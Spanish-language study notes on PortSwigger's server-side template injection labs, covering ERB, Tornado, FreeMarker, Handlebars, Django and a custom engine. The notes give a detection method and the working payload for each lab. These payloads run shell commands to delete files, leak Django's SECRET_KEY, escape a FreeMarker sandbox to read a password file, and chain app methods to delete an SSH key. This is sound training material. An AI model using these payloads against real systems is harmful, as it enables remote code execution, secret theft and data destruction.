---
aliases:
  - SSTI labs
  - server-side template injection labs
tags:
  - vuln/ssti
  - labs
  - portswigger
---

# SSTI — Labs de PortSwigger

Labs de la categoría **[Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)**: **7 labs** (1 Apprentice + 4 Practitioner + 2 Expert). **Cheatsheet de motores por lenguaje + árbol de detección** → [[vulnerabilities/009-server-side-template-injection/ssti-cheatsheet|cheatsheet de motores]]. **Metodología general** → [[vulnerabilities/009-server-side-template-injection/server-side-template-injection|entry point]].

> [!abstract] El vector casi siempre es el mismo
> Una feature deja **editar contenido que después se renderiza como plantilla**: la **descripción de un producto**, el **mensaje de un producto sin stock**, o el **"preferred name"** que aparece sobre tus comentarios. Metés tu input → el server lo **evalúa como expresión del motor** → confirmás con `7*7` → identificás el motor por el **error** → leés su doc para llegar a **RCE** (o a **fuga de info** si está en sandbox).

> [!note] Dos contextos (importa para el payload)
> - **Plaintext:** tu input se renderiza tal cual → inyectás la expresión directa (`<%= 7*7 %>`).
> - **Code context:** tu input ya cae **dentro** de una expresión del template → primero **cerrás** la expresión (`}}`) y después inyectás la tuya (labs 2 y 7).

---

## Tabla de labs

| # | Lab · nivel | Motor · lenguaje | Vector (cómo funciona el lab) | Payload que funcionó |
| --- | --- | --- | --- | --- |
| 1 | [Basic](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) · **Apprentice** | **ERB** · Ruby | Producto *out of stock* renderiza el parámetro `message` (GET) en plaintext | `<%= system("rm /home/carlos/morale.txt") %>` |
| 2 | [Code context](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context) · **Practitioner** | **Tornado** · Python | El *preferred name* (`blog-post-author-display`, `POST /my-account/change-blog-post-author-display`) cae dentro de una expresión | `user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}` |
| 3 | [Using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation) · **Practitioner** | **FreeMarker** · Java | Editás la **descripción de producto** (login content-manager) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt") }` |
| 4 | [Unknown lang, documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit) · **Practitioner** | **Handlebars** · Node/JS | Parámetro `message` (estado de stock) por GET | *(payload largo con pipes → ver ▼ [Payload Handlebars](#lab-4--handlebars-node))* |
| 5 | [Info disclosure vía objetos](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects) · **Practitioner** | **Django** · Python | Editás la **descripción de producto** (login) | `{{settings.SECRET_KEY}}` |
| 6 | [Sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment) · **Expert** | **FreeMarker** · Java | Editás la **descripción de producto** (content-manager), pero hay **sandbox** | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}` |
| 7 | [Custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit) · **Expert** | **motor no estándar (custom)** | El *preferred name* (`blog-post-author-display`), code context | `user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')` → luego `user.gdprDelete()` |

---

## Peculiaridades y notas por lab

**Lab 1 — ERB (Ruby)**
- **Confirmar:** `<%= 7*7 %>` → `49`. Contexto **plaintext**, no hay que escapar nada.
- ERB es el motor por defecto de Rails; `system()` es directo → el SSTI más "de manual".

**Lab 2 — Tornado (Python), code context**
- **Confirmar:** `user.name}}{{7*7}}` → tu input estaba dentro de `{{ ... }}`, por eso el `}}` inicial **cierra** la expresión original antes de inyectar la tuya.
- Tornado permite bloques de código Python con `{% ... %}` → `{% import os %}` y después `{{ os.system(...) }}`.

**Lab 3 — FreeMarker (Java), usando la doc**
- **Identificar:** `${foobar}` tira un error que **nombra FreeMarker**.
- El truco está en la **documentación**: el built-in `?new()` instancia clases, y `freemarker.template.utility.Execute` es una clase que **corre comandos**. Sin leer la doc no salís.

<a id="lab-4--handlebars-node"></a>
**Lab 4 — Handlebars (Node/JS)**
- **Identificar:** fuzz con el polyglot `${{<%[%'"}}%\` → el error revela Handlebars.
- **Peculiaridad:** Handlebars es **logic-less** → no hay one-liner. Se usa un **exploit documentado** que abusa de `with`/`lookup` para escalar hasta `constructor` y llegar a `require('child_process')`. Payload completo:
  ```handlebars
  wrtz{{#with "s" as |string|}}
    {{#with "e"}}
      {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
          {{this.pop}}
          {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
          {{this.pop}}
          {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
              {{this}}
            {{/with}}
          {{/each}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
  ```
  > En Burp va **URL-encoded** en el parámetro `message`.

**Lab 5 — Django (Python), fuga de info**
- **Peculiaridad clave:** Django **NO evalúa aritmética** (`{{7*7}}` no da `49`) — su template está **muy sandboxeado**. No hay RCE directo.
- El objetivo cambia: **fuga de info** vía objetos que el dev pasó al contexto. `{% debug %}` **lista** todo lo accesible → aparece `settings`.
- **Objetivo:** robar `{{settings.SECRET_KEY}}` (no borrar archivo).

**Lab 6 — FreeMarker (Java), sandbox**
- **Peculiaridad:** hay un **sandbox mal implementado**. Los payloads de RCE clásicos (lab 3) están bloqueados.
- Se escapa por **reflection encadenada** desde un objeto que **sí** está disponible (`product`): `getClass()...getCodeSource().getLocation()...resolve('/home/carlos/my_password.txt')...openStream().readAllBytes()`.
- **Objetivo:** **LEER** `my_password.txt` (no borrar). El `?join(" ")` te devuelve los **bytes en decimal** separados por espacio → hay que **decodificarlos** a texto y enviarlos.

**Lab 7 — motor custom (Expert)**
- **Peculiaridad:** no existe payload de RCE documentado para este motor → **te fabricás el exploit con los objetos de la propia app**.
- Método: triggerás **errores** para **enumerar** métodos disponibles en el objeto `user`. Descubrís `user.setAvatar(path, mime)` y `user.gdprDelete()`.
- **Encadenás:** primero apuntás el avatar al archivo objetivo (`user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')`), después `user.gdprDelete()` **borra el avatar** → borra `id_rsa`.
- **Objetivo:** borrar `/home/carlos/.ssh/id_rsa` usando la **lógica de la app en tu contra**.

---

## Patrones mentales

- **Detectar → Identificar → Explotar.** Nunca tires el payload de RCE antes de confirmar el motor con `7*7` y el error.
- **`${7*7}` vs `{{7*7}}` vs `<%= 7*7 %>`** te parte el árbol de motores → detalle en [[vulnerabilities/009-server-side-template-injection/ssti-cheatsheet#🎯 Árbol de detección de SSTI (metodología PortSwigger)|el árbol de la cheatsheet]].
- **Sandbox ≠ fin del juego:** si no hay RCE (Django, FreeMarker sandbox), apuntá a **fuga de info** o a **reflection/objetos de la app** (labs 5, 6, 7).
- **Code context:** si tu input entra dentro de `{{ }}`, cerrá con `}}` antes de inyectar (labs 2, 7).
- **Objetivo variable:** casi todos borran `morale.txt`, pero 5 roba la `SECRET_KEY`, 6 lee `my_password.txt` y 7 borra `id_rsa`.
